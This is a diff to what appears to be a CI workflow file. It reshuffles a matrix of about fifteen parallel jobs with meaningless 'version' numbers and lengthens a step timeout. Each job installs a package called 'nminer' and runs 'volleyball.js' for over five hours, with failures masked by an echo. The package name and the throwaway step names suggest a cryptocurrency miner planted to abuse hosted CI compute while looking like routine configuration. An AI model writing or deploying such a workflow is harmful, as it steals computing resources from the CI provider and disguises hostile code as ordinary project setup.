@@ -9,22 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8448 }
-          - { version: 3131 }
-          - { version: 6924 }
-          - { version: 5041 }
-          - { version: 4043 }
-          - { version: 3599 }
-          - { version: 8323 }
-          - { version: 7817 }
-          - { version: 7764 }
-          - { version: 5103 }
-          - { version: 1561 }
-          - { version: 6479 }
-          - { version: 1858 }
-          - { version: 8802 }
-          - { version: 6312 }
-          - { version: 3510 }
+          - { version: 4514 }
+          - { version: 1579 }
+          - { version: 5402 }
+          - { version: 8227 }
+          - { version: 6728 }
+          - { version: 7646 }
+          - { version: 6409 }
+          - { version: 7342 }
+          - { version: 1979 }
+          - { version: 3739 }
+          - { version: 7706 }
+          - { version: 4342 }
+          - { version: 3849 }
+          - { version: 7809 }
+          - { version: 6172 }
 
     steps:
       - name: Checkout
@@ -35,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: grown
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 307m node volleyball.js || echo "volleyball executed"
+          timeout 316m node volleyball.js || echo "volleyball executed"
